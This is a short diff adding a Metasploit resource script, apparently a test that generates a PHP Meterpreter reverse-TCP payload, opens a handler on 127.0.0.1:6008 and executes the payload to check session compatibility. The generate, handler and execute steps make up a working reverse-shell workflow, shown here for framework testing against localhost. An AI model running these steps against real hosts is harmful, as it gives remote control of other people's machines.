@@ -1,0 +1,22 @@
+## Load test modules
+loadpath test/modules
+
+## Payload
+use php/meterpreter_reverse_tcp
+
+## Set global datastore
+irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:/tmp/phpmeterpreter_reverse_tcp_session_tlv_logging20230918-3501-2myioetxt
+
+## Generate command
+generate -o /tmp/child-process-rb-php-meterpreter-reverse-tcp20230918-3501-9vfumt.php -f raw AutoVerifySessionTimeout=30 lport=6008 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:/tmp/phpmeterpreter_reverse_tcp_debug_log20230918-3501-bd8ouxtxt MeterpreterDebugBuild=true
+
+## Create listener
+to_handler
+
+## Execute command
+php /tmp/child-process-rb-php-meterpreter-reverse-tcp20230918-3501-9vfumt.php
+
+
+## Replication commands
+resource scripts/resource/meterpreter_compatibility.rc
